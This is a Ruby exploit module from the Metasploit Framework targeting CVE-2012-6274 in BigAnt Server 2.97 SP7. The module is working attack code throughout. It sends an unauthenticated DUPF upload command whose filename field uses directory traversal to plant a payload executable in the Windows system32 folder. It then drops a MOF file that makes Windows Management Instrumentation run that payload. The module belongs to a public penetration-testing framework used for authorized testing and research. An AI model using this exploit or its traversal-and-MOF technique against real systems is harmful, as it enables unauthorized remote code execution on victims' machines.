##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::EXE
	include Msf::Exploit::WbemExec
	include Msf::Exploit::FileDropper

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'BigAnt Server DUPF Command Arbitrary File Upload',
			'Description'    => %q{
					This exploits an arbitrary file upload vulnerability in BigAnt Server 2.97 SP7.
				A lack of authentication allows to make unauthenticated file uploads through a DUPF
				command. Additionally the filename option in the same command can be used to launch
				a directory traversal attack and achieve arbitrary file upload.

				The module uses uses the Windows Management Instrumentation service to execute an
				arbitrary payload on vulnerable installations of BigAnt on Windows XP and 2003. It
				has been successfully tested on BigAnt Server 2.97 SP7 over Windows XP SP3 and 2003
				SP2.
			},
			'Author'         =>
				[
					'Hamburgers Maccoy', # Vulnerability discovery
					'juan vazquez'       # Metasploit module
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2012-6274' ],
					[ 'US-CERT-VU', '990652' ],
					[ 'BID', '57214' ],
					[ 'OSVDB', '89342' ]
				],
			'Privileged'     => true,
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'BigAnt Server 2.97 SP7', { } ]
				],
			'DefaultTarget' => 0,
			'DefaultOptions'  =>
				{
					'WfsDelay' => 10
				},
			'DisclosureDate' => 'Jan 09 2013'))

		register_options(
			[
				Opt::RPORT(6661),
				OptInt.new('DEPTH', [true, "Levels to reach base directory", 6])
			], self.class)

	end

	def upload_file(filename, content)

		random_date = "#{rand_text_numeric(4)}-#{rand_text_numeric(2)}-#{rand_text_numeric(2)} #{rand_text_numeric(2)}:#{rand_text_numeric(2)}:#{rand_text_numeric(2)}"

		dupf = "DUPF 16\n"
		dupf << "cmdid: 1\n"
		dupf << "content-length: #{content.length}\n"
		dupf << "content-type: Appliction/Download\n"
		dupf << "filename: #{"\\.." * datastore['DEPTH']}\\#{filename}\n"
		dupf << "modified: #{random_date}\n"
		dupf << "pclassid: 102\n"
		dupf << "pobjid: 1\n"
		dupf << "rootid: 1\n"
		dupf << "sendcheck: 1\n\n"
		dupf << content

		print_status("sending DUPF")
		connect
		sock.put(dupf)
		res = sock.get_once
		disconnect
		return res

	end

	def exploit

		peer = "#{rhost}:#{rport}"

		# Setup the necessary files to do the wbemexec trick
		exe_name = rand_text_alpha(rand(10)+5) + '.exe'
		exe      = generate_payload_exe
		mof_name = rand_text_alpha(rand(10)+5) + '.mof'
		mof      = generate_mof(mof_name, exe_name)

		print_status("#{peer} - Sending HTTP ConvertFile Request to upload the exe payload #{exe_name}")
		res = upload_file("WINDOWS\\system32\\#{exe_name}", exe)
		if res and res =~ /DUPF/ and res =~ /fileid: (\d+)/
			print_good("#{peer} - #{exe_name} uploaded successfully")
		else
			if res and res =~ /ERR 9/ and res =~ /#{exe_name}/ and res =~ /lasterror: 183/
				print_error("#{peer} - Upload failed, check the DEPTH option")
			end
			fail_with(Exploit::Failure::UnexpectedReply, "#{peer} - Failed to upload #{exe_name}")
		end

		print_status("#{peer} - Sending HTTP ConvertFile Request to upload the mof file #{mof_name}")
		res = upload_file("WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
		if res and res =~ /DUPF/ and res =~ /fileid: (\d+)/
			print_good("#{peer} - #{mof_name} uploaded successfully")
			register_file_for_cleanup(exe_name)
			register_file_for_cleanup("wbem\\mof\\good\\#{mof_name}")
		else
			if res and res =~ /ERR 9/ and res =~ /#{exe_name}/ and res =~ /lasterror: 183/
				print_error("#{peer} - Upload failed, check the DEPTH option")
			end
			fail_with(Exploit::Failure::UnexpectedReply, "#{peer} - Failed to upload #{mof_name}")
		end

	end

end
